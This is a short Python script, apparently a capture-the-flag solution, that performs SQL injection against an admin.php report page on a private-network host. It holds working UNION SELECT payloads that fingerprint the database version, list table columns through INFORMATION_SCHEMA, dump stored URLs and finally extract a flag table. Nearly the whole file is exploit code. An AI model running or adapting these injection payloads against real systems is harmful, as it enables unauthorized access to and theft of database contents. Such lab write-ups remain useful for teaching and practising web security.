#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: john
# @Date:   2016-09-24 10:22:00
# @Last Modified by:   john
# @Last Modified time: 2016-09-24 12:25:13


import requests
import urllib


host = "http://10.13.37.12/admin.php?page=report&id="

s = requests.Session()


'''
# WHAT WE KNOW FROM TESTING
# comment style is #
# reports has 4 fields
# urls has four fields

'''

# print urllib.quote('" OR "1"="1"#')
#r = s.get(host + urllib.quote('" UNION SELECT 1,2,( SELECT GROUP_CONCAT(url SEPARATOR "\n") FROM urls ),4 FROM reports #'))
#r = s.get(host + urllib.quote('" UNION SELECT 1,2,( SELECT @@version ),4 FROM reports #'))

#r = s.get(host + urllib.quote('" UNION SELECT 1,2,( SELECT GROUP_CONCAT( COLUMN_NAME ) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="reports"),4 FROM reports #'))
r = s.get(host + urllib.quote('" UNION SELECT 1,2, ( SELECT flag FROM flag ),4 FROM reports #'))

print r.text


s.close()